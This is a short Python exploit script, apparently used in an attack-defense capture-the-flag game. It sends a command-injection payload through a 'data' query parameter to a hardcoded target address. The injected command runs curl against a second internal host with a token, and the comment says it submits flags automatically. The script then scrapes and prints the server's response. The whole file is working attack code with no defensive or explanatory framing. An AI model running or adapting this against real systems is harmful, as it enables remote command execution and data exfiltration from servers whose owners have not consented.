import re
import requests

urls = [
    "http://101.71.29.6:10015/frontend/web/html5/?data=",
    "http://101.71.29.6:10015/frontend/web/html5/?data="
        ]
cmd = "curl http://10.0.1.2?token=WNHOMGGL"

for url in urls:
    f = requests.get(url+cmd)
    data = re.findall('<div class="container">-->(.*?)<div class="wrap', f.content, flags=re.DOTALL)
    print(data[0])
    # 自动提交flag
